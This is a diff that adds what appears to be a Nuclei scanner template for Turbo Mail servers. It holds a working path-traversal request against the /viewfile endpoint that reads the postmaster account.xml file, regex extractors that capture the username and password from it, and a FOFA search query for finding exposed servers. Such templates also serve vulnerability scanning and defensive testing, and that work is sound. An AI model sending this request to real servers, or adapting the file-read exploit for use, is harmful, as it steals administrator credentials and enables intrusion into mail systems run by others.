@@ -1,0 +1,36 @@
+id: turbo-mail-viewfile-fileread
+
+info:
+  name: turbo-mail-viewfile-fileread
+  author: unknow
+  severity: high
+  metadata:
+    fofa-query: body="maintlogin.jsp" && body="/mailmain?type=logout"
+    veified: true
+  tags: turbo,rce
+
+http:
+  - raw:
+    - |
+      GET /viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml HTTP/1.1
+      Host: 
+      Accept-Language: en-US;q=0.9,en;q=0.8
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15              
+
+    extractors:
+      - type: regex
+        name: username_echo
+        part: body
+        regex:
+          - "<username>(.*)</username>"
+      - type: regex
+        name: password_echo
+        part: body
+        regex:
+          - "<password>(.*)</password>"          
+          
+    matchers:     
+      - type: dsl
+        name: fileread
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'<username>') && contains(body_1,'<password>') && contains(header_1,'text/plain')"           
